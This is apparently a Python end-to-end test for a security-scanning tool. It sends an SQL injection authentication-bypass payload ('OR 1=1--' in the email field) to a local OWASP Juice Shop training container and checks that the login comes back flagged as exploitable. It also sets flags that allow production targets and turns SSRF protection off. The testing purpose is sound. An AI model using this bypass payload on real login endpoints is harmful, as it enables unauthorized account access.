"""End-to-end blueprint test against REAL OWASP Juice Shop.

Juice Shop (bkimminich/juice-shop docker image) is a deliberately
vulnerable app used in security training. We point our SQL injection
blueprint at its real `/rest/user/login` endpoint and assert the
generated verdict is `exploitable`.

This closes the "blueprints only proven against mocks" gap. If Juice Shop
is not running on :3000 the test is skipped, so CI without the container
doesn't fail.
"""
from __future__ import annotations

import asyncio
import importlib
import os
import socket
import sys
from pathlib import Path

import pytest
import yaml as pyyaml

REPO_ROOT = Path(__file__).resolve().parents[3]
CORE_SRC = REPO_ROOT / "flyto-core" / "src"
AI_ROOT = REPO_ROOT / "flyto-ai"
for p in (str(CORE_SRC), str(AI_ROOT)):
    if p not in sys.path:
        sys.path.insert(0, p)

os.environ["FLYTO_ALLOW_PRIVATE_NETWORK"] = "true"
os.environ["FLYTO_AI_ALLOW_PROD_TARGETS"] = "1"

JUICE_HOST = "127.0.0.1"
JUICE_PORT = 3000


def _juice_shop_running() -> bool:
    """Check if juice-shop container answered on :3000."""
    try:
        s = socket.create_connection((JUICE_HOST, JUICE_PORT), timeout=1.0)
        s.close()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(
    not _juice_shop_running(),
    reason="juice-shop not running on :3000 — "
    "`docker run -d -p 3000:3000 bkimminich/juice-shop` to enable",
)


def _load_modules():
    for m in (
        "core.modules.atomic.http.batch",
        "core.modules.atomic.testing.assert_status",
        "core.modules.atomic.testing.assert_contains",
        "core.modules.atomic.flow",
        "core.modules.atomic.output",
    ):
        importlib.import_module(m)
    from core.modules.registry import get_module
    return get_module


@pytest.mark.asyncio
async def test_sql_injection_blueprint_against_juice_shop():
    """SQL-injection blueprint → real Juice Shop → exploitable.

    Juice Shop's /rest/user/login accepts `email` + `password` and is
    vulnerable to SQL injection via the email field. We hand-craft the
    probes to match that shape (the generic blueprint targets GET /api/users
    with a `user_id` query param, which doesn't apply here).
    """
    get_module = _load_modules()
    http_batch_cls = get_module("http.batch")
    assert_status_cls = get_module("test.assert_status")

    url = f"http://{JUICE_HOST}:{JUICE_PORT}/rest/user/login"
    headers = {"Content-Type": "application/json"}

    # Baseline: wrong creds should fail (401-ish).
    # Probe: SQLi bypass via email `'`... OR 1=1--
    probes = [
        {
            "method": "POST", "url": url, "headers": headers,
            "body": {"email": "nonexistent@example.com", "password": "wrong"},
            "label": "baseline_wrong",
        },
        {
            "method": "POST", "url": url, "headers": headers,
            "body": {"email": "admin@juice-sh.op' OR 1=1--", "password": "x"},
            "label": "sqli_tautology",
        },
    ]

    inst = http_batch_cls(
        params={"requests": probes, "ssrf_protection": False, "timeout": 15},
        context={},
    )
    batch = await inst.execute()
    statuses = [r["status"] for r in batch["data"]]
    assert batch["ok"], batch
    assert statuses[0] == 401, f"baseline wrong creds should 401, got {statuses[0]}"
    assert statuses[1] == 200, f"SQLi bypass should 200, got {statuses[1]}"

    # Feed into assert_status — baseline=401, probe flipped to 200 → bypass.
    status_inst = assert_status_cls(
        params={
            "source": batch,
            "baseline_index": 0,
            "probe_indices": [1],
            "expected_blocked": [401, 403, 422],
            "on_bypass": "exploitable",
            "on_blocked": "sanitized",
        },
        context={},
    )
    r = await status_inst.execute()
    assert r["verdict"] == "exploitable", (
        f"Juice Shop login IS SQLi-vulnerable — verdict should be exploitable, "
        f"got {r['verdict']}. Full result: {r}"
    )
    # The response leaks the admin email — proof the SQLi logged us in as
    # admin without knowing the password. The role is inside the signed JWT
    # so we don't unwrap it here.
    probe_body = batch["data"][1]["body"]
    assert 'admin@juice-sh.op' in probe_body, (
        "Juice Shop returned 200 but no admin email in body — fixture may "
        "have drifted. Body starts: " + probe_body[:200]
    )
